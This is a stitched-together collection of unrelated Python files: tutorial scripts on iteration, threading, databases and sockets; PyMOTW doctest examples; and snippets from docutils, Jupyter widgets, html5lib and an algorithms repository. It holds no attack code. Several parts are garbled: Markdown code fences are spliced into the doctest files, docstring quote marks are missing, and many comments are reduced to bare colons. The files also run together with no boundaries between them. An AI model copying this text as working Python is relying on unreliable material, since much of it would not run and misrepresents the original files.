# -*- coding: utf-8 -*-

# :
# input()
# int()
# :
age = int(input("Input your age: "))

if age >= 18:
    print("adult")
elif age >= 6:
    print("teenager")
else:
    print("kid")

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from collections.abc import Iterable, Iterator


def g():
    yield 1
    yield 2
    yield 3


print("Iterable? [1, 2, 3]:", isinstance([1, 2, 3], Iterable))
print("Iterable? 'abc':", isinstance("abc", Iterable))
print("Iterable? 123:", isinstance(123, Iterable))
print("Iterable? g():", isinstance(g(), Iterable))

print("Iterator? [1, 2, 3]:", isinstance([1, 2, 3], Iterator))
print("Iterator? iter([1, 2, 3]):", isinstance(iter([1, 2, 3]), Iterator))
print("Iterator? 'abc':", isinstance("abc", Iterator))
print("Iterator? 123:", isinstance(123, Iterator))
print("Iterator? g():", isinstance(g(), Iterator))

# iter list:
print("for x in [1, 2, 3, 4, 5]:")
for x in [1, 2, 3, 4, 5]:
    print(x)

print("for x in iter([1, 2, 3, 4, 5]):")
for x in iter([1, 2, 3, 4, 5]):
    print(x)

print("next():")
it = iter([1, 2, 3, 4, 5])
print(next(it))
print(next(it))
print(next(it))
print(next(it))
print(next(it))

d = {"a": 1, "b": 2, "c": 3}

# iter each key:
print("iter key:", d)
for k in d.keys():
    print("key:", k)

# iter each value:
print("iter value:", d)
for v in d.values():
    print("value:", v)

# iter both key and value:
print("iter item:", d)
for k, v in d.items():
    print("item:", k, v)

# iter list with index:
print("iter enumerate(['A', 'B', 'C']")
for i, value in enumerate(["A", "B", "C"]):
    print(i, value)

# iter complex list:
print("iter [(1, 1), (2, 4), (3, 9)]:")
for x, y in [(1, 1), (2, 4), (3, 9)]:
    print(x, y)

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

print([x * x for x in range(1, 11)])
print([x * x for x in range(1, 11) if x % 2 == 0])
print([m + n for m in "ABC" for n in "XYZ"])

d = {"x": "A", "y": "B", "z": "C"}
print([k + "=" + v for k, v in d.items()])

L = ["Hello", "World", "IBM", "Apple"]
print([s.lower() for s in L])

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import time, threading

# :
balance = 0
lock = threading.Lock()


def change_it(n):
    # :
    global balance
    balance = balance + n
    balance = balance - n


def run_thread(n):
    for i in range(100000):
        # :
        lock.acquire()
        try:
            # :
            change_it(n)
        finally:
            # :
            lock.release()


t1 = threading.Thread(target=run_thread, args=(5,))
t2 = threading.Thread(target=run_thread, args=(8,))
t1.start()
t2.start()
t1.join()
t2.join()
print(balance)

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import logging

logging.basicConfig(level=logging.INFO)

s = "0"
n = int(s)
logging.info("n = %d" % n)
print(10 / n)

#!/usr/bin/env python3
# -*- coding: utf-8 -*-


def f(x):
    return x * x


print(list(map(f, [1, 2, 3, 4, 5, 6, 7, 8, 9])))

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

########## prepare ##########

# install mysql-connector-python:
# pip3 install mysql-connector-python --allow-external mysql-connector-python

import mysql.connector

# change root password to yours:
conn = mysql.connector.connect(user="root", password="password", database="test")

cursor = conn.cursor()
# user:
cursor.execute("create table user (id varchar(20) primary key, name varchar(20))")
# ，MySQL%s:
cursor.execute("insert into user (id, name) values (%s, %s)", ("1", "Michael"))
print("rowcount =", cursor.rowcount)
# :
conn.commit()
cursor.close()

# :
cursor = conn.cursor()
cursor.execute("select * from user where id = %s", ("1",))
values = cursor.fetchall()
print(values)
# CursorConnection:
cursor.close()
conn.close()

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import functools

int2 = functools.partial(int, base=2)

print("1000000 =", int2("1000000"))
print("1010101 =", int2("1010101"))

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import pdb

s = "0"
n = int(s)
pdb.set_trace()  #
print(10 / n)

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

print("The quick brown fox", "jumps over", "the lazy dog")
print(300)
print(100 + 200)
print("100 + 200 =", 100 + 200)

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from multiprocessing import Process, Queue
import os, time, random

# :
def write(q):
    print("Process to write: %s" % os.getpid())
    for value in ["A", "B", "C"]:
        print("Put %s to queue..." % value)
        q.put(value)
        time.sleep(random.random())


# :
def read(q):
    print("Process to read: %s" % os.getpid())
    while True:
        value = q.get(True)
        print("Get %s from queue." % value)


if __name__ == "__main__":
    # Queue，：
    q = Queue()
    pw = Process(target=write, args=(q,))
    pr = Process(target=read, args=(q,))
    # pw，:
    pw.start()
    # :
    pr.start()
    # pw:
    pw.join()
    # pr，，:
    pr.terminate()

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from functools import reduce

CHAR_TO_INT = {
    "0": 0,
    "1": 1,
    "2": 2,
    "3": 3,
    "4": 4,
    "5": 5,
    "6": 6,
    "7": 7,
    "8": 8,
    "9": 9,
}


def str2int(s):
    ints = map(lambda ch: CHAR_TO_INT[ch], s)
    return reduce(lambda x, y: x * 10 + y, ints)


print(str2int("0"))
print(str2int("12300"))
print(str2int("0012345"))

CHAR_TO_FLOAT = {
    "0": 0,
    "1": 1,
    "2": 2,
    "3": 3,
    "4": 4,
    "5": 5,
    "6": 6,
    "7": 7,
    "8": 8,
    "9": 9,
    ".": -1,
}


def str2float(s):
    nums = map(lambda ch: CHAR_TO_FLOAT[ch], s)
    point = 0

    def to_float(f, n):
        nonlocal point
        if n == -1:
            point = 1
            return f
        if point == 0:
            return f * 10 + n
        else:
            point = point * 10
            return f + n / point

    return reduce(to_float, nums, 0.0)


print(str2float("0"))
print(str2float("123.456"))
print(str2float("123.45600"))
print(str2float("0.1234"))
print(str2float(".1234"))
print(str2float("120.0034"))

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

L = ["Michael", "Sarah", "Tracy", "Bob", "Jack"]

print("L[0:3] =", L[0:3])
print("L[:3] =", L[:3])
print("L[1:3] =", L[1:3])
print("L[-2:] =", L[-2:])

R = list(range(100))
print("R[:10] =", R[:10])
print("R[-10:] =", R[-10:])
print("R[10:20] =", R[10:20])
print("R[:10:2] =", R[:10:2])
print("R[::5] =", R[::5])

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from operator import itemgetter

L = ["bob", "about", "Zoo", "Credit"]

print(sorted(L))
print(sorted(L, key=str.lower))

students = [("Bob", 75), ("Adam", 92), ("Bart", 66), ("Lisa", 88)]

print(sorted(students, key=itemgetter(0)))
print(sorted(students, key=lambda t: t[1]))
print(sorted(students, key=itemgetter(1), reverse=True))

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from sqlalchemy import Column, String, create_engine
from sqlalchemy.orm import sessionmaker
from sqlalchemy.ext.declarative import declarative_base

# :
Base = declarative_base()

# User:
class User(Base):
    # :
    __tablename__ = "user"

    # :
    id = Column(String(20), primary_key=True)
    name = Column(String(20))


# :
engine = create_engine("mysql+mysqlconnector://root:password@localhost:3306/test")
# DBSession:
DBSession = sessionmaker(bind=engine)

# session:
session = DBSession()
# User:
new_user = User(id="5", name="Bob")
# session:
session.add(new_user)
# :
session.commit()
# session:
session.close()

# Session:
session = DBSession()
# Query，filterwhere，one()，:
user = session.query(User).filter(User.id == "5").one()
# name:
print("type:", type(user))
print("name:", user.name)
# Session:
session.close()

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sqlite3

# SQLite
# test.db
# ，:
conn = sqlite3.connect("test.db")
# Cursor:
cursor = conn.cursor()
# SQL，user:
cursor.execute("create table user (id varchar(20) primary key, name varchar(20))")
# SQL，:
cursor.execute("insert into user (id, name) values ('1', 'Michael')")
# rowcount:
print("rowcount =", cursor.rowcount)
# Cursor:
cursor.close()
# :
conn.commit()
# Connection:
conn.close()

# ：
conn = sqlite3.connect("test.db")
cursor = conn.cursor()
# :
cursor.execute("select * from user where id=?", "1")
# :
values = cursor.fetchall()
print(values)
cursor.close()
conn.close()

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from io import StringIO

# write to StringIO:
f = StringIO()
f.write("hello")
f.write(" ")
f.write("world!")
print(f.getvalue())

# read from StringIO:
f = StringIO("，\n。\n，\n。")
while True:
    s = f.readline()
    if s == "":
        break
    print(s.strip())

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import subprocess

print("$ nslookup www.python.org")
r = subprocess.call(["nslookup", "www.python.org"])
print("Exit code:", r)

print("$ nslookup")
p = subprocess.Popen(
    ["nslookup"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE
)
output, err = p.communicate(b"set q=mx\npython.org\nexit\n")
print(output.decode("utf-8"))
print("Exit code:", p.returncode)

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os

from contextlib import suppress

with suppress(FileNotFoundError):
    os.remove("tempfile.1")
    os.remove("tempfile.2")
    os.remove("tempfile.3")

#!~/.wine/drive_c/Python25/python.exe
# -*- coding: utf-8 -*-

# Command line debugger using WinAppDbg
# Fix the symbol store path
# Copyright (c) 2009-2014, Mario Vilas
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are met:
#
#     * Redistributions of source code must retain the above copyright notice,
#       this list of conditions and the following disclaimer.
#     * Redistributions in binary form must reproduce the above copyright
#       notice,this list of conditions and the following disclaimer in the
#       documentation and/or other materials provided with the distribution.
#     * Neither the name of the copyright holder nor the names of its
#       contributors may be used to endorse or promote products derived from
#       this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
# ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGE.

__revision__ = "$Id$"


def do(self, arg):
    ".symfix - Set the default Microsoft Symbol Store settings if missing"
    self.debug.system.fix_symbol_store_path(remote=True, force=False)

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket

# socket:
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# :
s.connect(("www.sina.com.cn", 80))

# :
s.send(b"GET / HTTP/1.1\r\nHost: www.sina.com.cn\r\nConnection: close\r\n\r\n")

# :
buffer = []
while True:
    # 1k:
    d = s.recv(1024)
    if d:
        buffer.append(d)
    else:
        break

data = b"".join(buffer)

# :
s.close()

header, html = data.split(b"\r\n\r\n", 1)
print(header.decode("utf-8"))

# :
with open("sina.html", "wb") as f:
    f.write(html)

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

try:
    print("try...")
    r = 10 / 0
    print("result:", r)
except ZeroDivisionError as e:
    print("except:", e)
finally:
    print("finally...")
print("END")

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# 1+2+3+...+100:
sum = 0
n = 1
while n <= 100:
    sum = sum + n
    n = n + 1
print(sum)

# 1x2x3x...x100:
acc = 1
n = 1
while n <= 100:
    acc = acc * n
    n = n + 1
print(acc)

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from contextlib import contextmanager


@contextmanager
def log(name):
    print("[%s] start..." % name)
    yield
    print("[%s] end." % name)


with log("DEBUG"):
    print("Hello, world!")
    print("Hello, Python!")

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from wsgiref.simple_server import make_server

from hello import application

httpd = make_server("", 8000, application)
print("Serving HTTP on port 8000...")

httpd.serve_forever()

#!/usr/bin/env python3
# -*- coding: utf-8 -*-


def each_ascii(s):
    for ch in s:
        yield ord(ch)
    return "%s chars" % len(s)


def yield_from(s):
    r = yield from each_ascii(s)
    print(r)


def main():
    for x in each_ascii("abc"):
        print(x)  # => 'a', 'b', 'c'
    it = each_ascii("xyz")
    try:
        while True:
            print(next(it))  # => 'x', 'y', 'z'
    except StopIteration as s:
        print(s.value)  # => '3 chars'

    # using yield from in main() will change main() from function to generator:
    # r = yield from each_ascii('hello')

    for ch in yield_from("hello"):
        pass


main()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyBlank lines in the input cause mis-matches.```


```py
# end_pymotw_header
def double_space(lines):
    """Prints a list of lines double-spaced.

    >>> double_space(['Line one.', 'Line two.'])
    Line one.
    <BLANKLINE>
    Line two.
    <BLANKLINE>
    """
    for l in lines:
        print(l)
        print()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyBlank lines in the input cause mis-matches.```


```py
# end_pymotw_header
def double_space(lines):
    """Prints a list of lines double-spaced.

    >>> double_space(['Line one.', 'Line two.'])
    Line one.

    Line two.

    """
    for l in lines:
        print(l)
        print()

#!/usr/bin/env python3
# encoding: utf-8

# end_pymotw_header```


```pyTests can appear in any docstring within the module.

Module-level tests cross class and function boundaries.

>>> A('a') == B('b')
False```


```py


class A:
    """Simple class.

    >>> A('instance_name').name
    'instance_name'
    """

    def __init__(self, name):
        self.name = name

    def method(self):
        """Returns an unusual value.

        >>> A('name').method()
        'eman'
        """
        return "".join(reversed(self.name))


class B(A):
    """Another simple class.

    >>> B('different_name').name
    'different_name'
    """

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyIgnoring part of the verification value with ELIPSIS```


```py
# end_pymotw_header
class MyClass:
    pass


def unpredictable(obj):
    """Returns a new list containing obj.

    >>> unpredictable(MyClass()) #doctest: +ELLIPSIS
    [<doctest_ellipsis.MyClass object at 0x...>]
    """
    return [obj]

# Turn off flake8 tests for this file because it is apparently not
# possible to skip only the one for trailing whitespace:
# flake8: noqa
#
# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyWhitespace at the end of a line can cause a mis-match.```


```py
# end_pymotw_header
def my_function(a, b):
    """
    >>> my_function(2, 3)
    6
    >>> my_function('a', 3)
    'aaa'
    """
    return a * b

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyDemonstrate how insertion order affects dictonaries and sets.```


```py

# end_pymotw_header
keys = ["a", "aa", "aaa"]

print("dict:", {k: len(k) for k in keys})
print("set :", set(keys))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyDemonstrate how insertion order affects dictonaries and sets.```


```py

# end_pymotw_header
import collections


def group_by_length(words):
    """Returns a dictionary grouping words into sets by length.

    >>> grouped = group_by_length([ 'python', 'module', 'of',
    ... 'the', 'week' ])
    >>> grouped == { 2:set(['of']),
    ...              3:set(['the']),
    ...              4:set(['week']),
    ...              6:set(['python', 'module']),
    ...              }
    True

    """
    d = collections.defaultdict(set)
    for word in words:
        d[len(word)].add(word)
    return d

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyTests for this module are in the external help text.```


```py
# end_pymotw_header
def my_function(a, b):
    """Returns a*b
    """
    return a * b

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyTests that modify module-level global values.```


```py

# end_pymotw_header
_module_data = {}


class TestGlobals:
    def one(self):
        """
        >>> TestGlobals().one()
        >>> 'var' in _module_data
        True
        """
        _module_data["var"] = "value"

    def two(self):
        """
        >>> 'var' in _module_data
        False
        """

# Turn off flake8 tests for this file because it is apparently not
# possible to skip only the one for trailing whitespace:
# flake8: noqa
#
# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyWhitespace at the end of a line can cause a mis-match.```


```py

# end_pymotw_header
def my_function(a, b):
    """
    >>> my_function(2, 3) #doctest: +REPORT_NDIFF
    6
    >>> my_function('a', 3)
    'aaa'
    """
    return a * b

# Turn off flake8 tests for this file because it is apparently not
# possible to skip only the one for long lines:
# flake8: noqa
#
# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyTelling doctest to ignore extra whitespace in test data.```


```py
# end_pymotw_header
def my_function(a, b):
    """Returns a * b.

    >>> my_function(['A', 'B'], 3) #doctest: +NORMALIZE_WHITESPACE
    ['A', 'B',
     'A', 'B',
     'A', 'B']

    This does not match because of the extra space after the [ in
    the list.

    >>> my_function(['A', 'B'], 2) #doctest: +NORMALIZE_WHITESPACE
    [ 'A', 'B',
      'A', 'B', ]
    """
    return a * b

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyDefining tests not visible in the documentation.```


```py

# end_pymotw_header
import doctest_private_tests_external

__test__ = {
    "numbers": """
>>> my_function(2, 3)
6

>>> my_function(2.0, 3)
6.0```


```py,
    "strings": """
>>> my_function('a', 3)
'aaa'

>>> my_function(3, 'a')
'aaa'```


```py,
    "external": doctest_private_tests_external,
}


def my_function(a, b):
    """Returns a * b
    """
    return a * b

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#
# end_pymotw_header```


```pyExternal tests associated with doctest_private_tests.py.

>>> my_function(['A', 'B', 'C'], 2)
['A', 'B', 'C', 'A', 'B', 'C']```


```py

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pySimple example using doctest```


```py

# end_pymotw_header
def my_function(a, b):
    """
    >>> my_function(2, 3)
    6
    >>> my_function('a', 3)
    'aaa'
    """
    return a * b

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pySimple example using doctest```


```py

# end_pymotw_header
def my_function(a, b):
    """Returns a * b.

    Works with numbers:

    >>> my_function(2, 3)
    6

    and strings:

    >>> my_function('a', 3)
    'aaa'
    """
    return a * b

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyShow the globals exposed in a test.```


```py
# end_pymotw_header
class TestGlobals:
    def one(self):
        """
        >>> var = 'value'
        >>> 'var' in globals()
        True
        """

    def two(self):
        """
        >>> 'var' in globals()
        False
        """

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyRun the tests from an external file.```


```py

# end_pymotw_header
import doctest

if __name__ == "__main__":
    doctest.testfile("doctest_in_help.txt")

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pySimple example using doctest```


```py

# end_pymotw_header
def my_function(a, b):
    """
    >>> my_function(2, 3)
    6
    >>> my_function('a', 3)
    'aaa'
    """
    return a * b


if __name__ == "__main__":
    import doctest

    doctest.testmod()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyRun tests for another module we import.```


```py

# end_pymotw_header
import doctest_simple

if __name__ == "__main__":
    import doctest

    doctest.testmod(doctest_simple)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyExpecting exceptions```


```py

# end_pymotw_header
def this_raises():
    """This function always raises an exception.

    >>> this_raises()
    Traceback (most recent call last):
      File "<stdin>", line 1, in <module>
      File "/no/such/path/doctest_tracebacks.py", line 14, in
      this_raises
        raise RuntimeError('here is the error')
    RuntimeError: here is the error
    """
    raise RuntimeError("here is the error")

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyExpecting exceptions```


```py

# end_pymotw_header
def this_raises():
    """This function always raises an exception.

    >>> this_raises()
    Traceback (most recent call last):
    RuntimeError: here is the error

    >>> this_raises()
    Traceback (innermost last):
    RuntimeError: here is the error
    """
    raise RuntimeError("here is the error")

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyIntegrating with unittest.```


```py

# end_pymotw_header
import doctest
import unittest

import doctest_simple

suite = unittest.TestSuite()
suite.addTest(doctest.DocTestSuite(doctest_simple))
suite.addTest(doctest.DocFileSuite("doctest_in_help.txt"))

runner = unittest.TextTestRunner(verbosity=2)
runner.run(suite)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyUnpredictable values in the expected results cause failures.```


```py

# end_pymotw_header
class MyClass:
    pass


def unpredictable(obj):
    """Returns a new list containing obj.

    >>> unpredictable(MyClass())
    [<doctest_unpredictable.MyClass object at 0x10055a2d0>]
    """
    return [obj]

# $Id: doctree.py 4564 2006-05-21 20:44:42Z wiemann $
# Author: Martin Blais <blais@furius.ca>
# Copyright: This module has been placed in the public domain.
````

```pyReader for existing document trees."""

from docutils import readers, utils, transforms


class Reader(readers.ReReader):

    """
    Adapt the Reader API for an existing document tree.

    The existing document tree must be passed as the ``source`` parameter to
    the `docutils.core.Publisher` initializer, wrapped in a
    `docutils.io.DocTreeInput` object::

        pub = docutils.core.Publisher(
            ..., source=docutils.io.DocTreeInput(document), ...)

    The original document settings are overridden; if you want to use the
    settings of the original document, pass ``settings=document.settings`` to
    the Publisher call above.
    """

    supported = ("doctree",)

    config_section = "doctree reader"
    config_section_dependencies = ("readers",)

    def parse(self):
        """
        No parsing to do; refurbish the document tree instead.
        Overrides the inherited method.
        """
        self.document = self.input
        # Create fresh Transformer object, to be populated from Writer
        # component.
        self.document.transformer = transforms.Transformer(self.document)
        # Replace existing settings object with new one.
        self.document.settings = self.settings
        # Create fresh Reporter object because it is dependent on
        # (new) settings.
        self.document.reporter = utils.new_reporter(
            self.document.get("source", ""), self.document.settings
        )

# Copyright (c) Jupyter Development Team.
# Distributed under the terms of the Modified BSD License.


def doc_subst(snippets):
    """ Substitute format strings in class or function docstring """

    def decorator(cls):
        # Running python with -OO will discard docstrings (__doc__ is None).
        if cls.__doc__ is not None:
            # Strip the snippets to avoid trailing new lines and whitespace
            stripped_snippets = {
                key: snippet.strip() for (key, snippet) in snippets.items()
            }
            cls.__doc__ = cls.__doc__.format(**stripped_snippets)
        return cls

    return decorator

from __future__ import absolute_import, division, unicode_literals

from xml.dom import Node

from . import base


class TreeWalker(base.NonRecursiveTreeWalker):
    def getNodeDetails(self, node):
        if node.nodeType == Node.DOCUMENT_TYPE_NODE:
            return base.DOCTYPE, node.name, node.publicId, node.systemId

        elif node.nodeType in (Node.TEXT_NODE, Node.CDATA_SECTION_NODE):
            return base.TEXT, node.nodeValue

        elif node.nodeType == Node.ELEMENT_NODE:
            attrs = {}
            for attr in list(node.attributes.keys()):
                attr = node.getAttributeNode(attr)
                if attr.namespaceURI:
                    attrs[(attr.namespaceURI, attr.localName)] = attr.value
                else:
                    attrs[(None, attr.name)] = attr.value
            return (
                base.ELEMENT,
                node.namespaceURI,
                node.nodeName,
                attrs,
                node.hasChildNodes(),
            )

        elif node.nodeType == Node.COMMENT_NODE:
            return base.COMMENT, node.nodeValue

        elif node.nodeType in (Node.DOCUMENT_NODE, Node.DOCUMENT_FRAGMENT_NODE):
            return (base.DOCUMENT,)

        else:
            return base.UNKNOWN, node.nodeType

    def getFirstChild(self, node):
        return node.firstChild

    def getNextSibling(self, node):
        return node.nextSibling

    def getParentNode(self, node):
        return node.parentNode

# Copyright (c) Jupyter Development Team.
# Distributed under the terms of the Modified BSD License.
```

```pyContains the DOMWidget class"""

from traitlets import Unicode
from .widget import Widget, widget_serialization
from .trait_types import InstanceDict, TypedTuple
from .widget_layout import Layout
from .widget_style import Style


class DOMWidget(Widget):
    """Widget that can be inserted into the DOM"""

    _model_name = Unicode("DOMWidgetModel").tag(sync=True)
    _dom_classes = TypedTuple(
        trait=Unicode(), help="CSS classes applied to widget DOM element"
    ).tag(sync=True)
    layout = InstanceDict(Layout).tag(sync=True, **widget_serialization)

    def add_class(self, className):
        """
        Adds a class to the top level element of the widget.

        Doesn't add the class if it already exists.
        """
        if className not in self._dom_classes:
            self._dom_classes = list(self._dom_classes) + [className]
        return self

    def remove_class(self, className):
        """
        Removes a class from the top level element of the widget.

        Doesn't remove the class if it doesn't exist.
        """
        if className in self._dom_classes:
            self._dom_classes = [c for c in self._dom_classes if c != className]
        return self

    def _repr_keys(self):
        for key in super(DOMWidget, self)._repr_keys():
            # Exclude layout if it had the default value
            if key == "layout":
                value = getattr(self, key)
                if repr(value) == "%s()" % value.__class__.__name__:
                    continue
            yield key
        # We also need to include _dom_classes in repr for reproducibility
        if self._dom_classes:
            yield "_dom_classes"

#!/bin/python3
# Doomsday algorithm info: https://en.wikipedia.org/wiki/Doomsday_rule

DOOMSDAY_LEAP = [4, 1, 7, 4, 2, 6, 4, 1, 5, 3, 7, 5]
DOOMSDAY_NOT_LEAP = [3, 7, 7, 4, 2, 6, 4, 1, 5, 3, 7, 5]
WEEK_DAY_NAMES = {
    0: "Sunday",
    1: "Monday",
    2: "Tuesday",
    3: "Wednesday",
    4: "Thursday",
    5: "Friday",
    6: "Saturday",
}


def get_week_day(year: int, month: int, day: int) -> str:
    """Returns the week-day name out of a given date.

    >>> get_week_day(2020, 10, 24)
    'Saturday'
    >>> get_week_day(2017, 10, 24)
    'Tuesday'
    >>> get_week_day(2019, 5, 3)
    'Friday'
    >>> get_week_day(1970, 9, 16)
    'Wednesday'
    >>> get_week_day(1870, 8, 13)
    'Saturday'
    >>> get_week_day(2040, 3, 14)
    'Wednesday'

    """
    # minimal input check:
    assert len(str(year)) > 2, "year should be in YYYY format"
    assert 1 <= month <= 12, "month should be between 1 to 12"
    assert 1 <= day <= 31, "day should be between 1 to 31"

    # Doomsday algorithm:
    century = year // 100
    century_anchor = (5 * (century % 4) + 2) % 7
    centurian = year % 100
    centurian_m = centurian % 12
    dooms_day = (
        (centurian // 12) + centurian_m + (centurian_m // 4) + century_anchor
    ) % 7
    day_anchor = (
        DOOMSDAY_NOT_LEAP[month - 1]
        if (year % 4 != 0) or (centurian == 0 and (year % 400) == 0)
        else DOOMSDAY_LEAP[month - 1]
    )
    week_day = (dooms_day + day - day_anchor) % 7
    return WEEK_DAY_NAMES[week_day]


if __name__ == "__main__":
    import doctest

    doctest.testmod()

# Python code to demonstrate working of
# extend(), extendleft(), rotate(), reverse()

# importing "collections" for deque operations
import collections

# initializing deque
de = collections.deque([1, 2, 3])

# using extend() to add numbers to right end
# adds 4,5,6 to right end
de.extend([4, 5, 6])

# printing modified deque
print("The deque after extending deque at end is : ")
print(de)

# using extendleft() to add numbers to left end
# adds 7,8,9 to right end
de.extendleft([7, 8, 9])

# printing modified deque
print("The deque after extending deque at beginning is : ")
print(de)

# using rotate() to rotate the deque
# rotates by 3 to left
de.rotate(-3)

# printing modified deque
print("The deque after rotating deque is : ")
print(de)

# using reverse() to reverse the deque
de.reverse()

# printing modified deque
print("The deque after reversing deque is : ")
print(de)

# get right-end value and eliminate
startValue = de.pop()

print("The deque after popping value at end is : ")
print(de)

# get left-end value and eliminate
endValue = de.popleft()

print("The deque after popping value at start is : ")
print(de)

# eliminate element searched by value
de.remove(5)

print("The deque after eliminating element searched by value : ")
print(de)

def double_factorial(n: int) -> int:
    """
    Compute double factorial using recursive method.
    Recursion can be costly for large numbers.

    To learn about the theory behind this algorithm:
    https://en.wikipedia.org/wiki/Double_factorial

    >>> import math
    >>> all(double_factorial(i) == math.prod(range(i, 0, -2)) for i in range(20))
    True
    >>> double_factorial(0.1)
    Traceback (most recent call last):
        ...
    ValueError: double_factorial() only accepts integral values
    >>> double_factorial(-1)
    Traceback (most recent call last):
        ...
    ValueError: double_factorial() not defined for negative values
    """
    if not isinstance(n, int):
        raise ValueError("double_factorial() only accepts integral values")
    if n < 0:
        raise ValueError("double_factorial() not defined for negative values")
    return 1 if n <= 1 else n * double_factorial(n - 2)


if __name__ == "__main__":
    import doctest

    doctest.testmod()

#!/usr/bin/env python3

from .hash_table import HashTable
from number_theory.prime_numbers import next_prime, check_prime


class DoubleHash(HashTable):
    """
        Hash Table example with open addressing and Double Hash
    """

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    def __hash_function_2(self, value, data):

        next_prime_gt = (
            next_prime(value % self.size_table)
            if not check_prime(value % self.size_table)
            else value % self.size_table
        )  # gt = bigger than
        return next_prime_gt - (data % next_prime_gt)

    def __hash_double_function(self, key, data, increment):
        return (increment * self.__hash_function_2(key, data)) % self.size_table

    def _colision_resolution(self, key, data=None):
        i = 1
        new_key = self.hash_function(data)

        while self.values[new_key] is not None and self.values[new_key] != key:
            new_key = (
                self.__hash_double_function(key, data, i)
                if self.balanced_factor() >= self.lim_charge
                else None
            )
            if new_key is None:
                break
            else:
                i += 1

        return new_key

from __future__ import annotations


def double_linear_search(array: list[int], search_item: int) -> int:
    """
    Iterate through the array from both sides to find the index of search_item.

    :param array: the array to be searched
    :param search_item: the item to be searched
    :return the index of search_item, if search_item is in array, else -1

    Examples:
    >>> double_linear_search([1, 5, 5, 10], 1)
    0
    >>> double_linear_search([1, 5, 5, 10], 5)
    1
    >>> double_linear_search([1, 5, 5, 10], 100)
    -1
    >>> double_linear_search([1, 5, 5, 10], 10)
    3
    """
    # define the start and end index of the given array
    start_ind, end_ind = 0, len(array) - 1
    while start_ind <= end_ind:
        if array[start_ind] == search_item:
            return start_ind
        elif array[end_ind] == search_item:
            return end_ind
        else:
            start_ind += 1
            end_ind -= 1
    # returns -1 if search_item is not found in array
    return -1


if __name__ == "__main__":
    print(double_linear_search(list(range(100)), 40))

def search(list_data: list, key: int, left: int = 0, right: int = 0) -> int:
    """
    Iterate through the array to find the index of key using recursion.
    :param list_data: the list to be searched
    :param key: the key to be searched
    :param left: the index of first element
    :param right: the index of last element
    :return: the index of key value if found, -1 otherwise.

    >>> search(list(range(0, 11)), 5)
    5
    >>> search([1, 2, 4, 5, 3], 4)
    2
    >>> search([1, 2, 4, 5, 3], 6)
    -1
    >>> search([5], 5)
    0
    >>> search([], 1)
    -1
    """
    right = right or len(list_data) - 1
    if left > right:
        return -1
    elif list_data[left] == key:
        return left
    elif list_data[right] == key:
        return right
    else:
        return search(list_data, key, left + 1, right - 1)


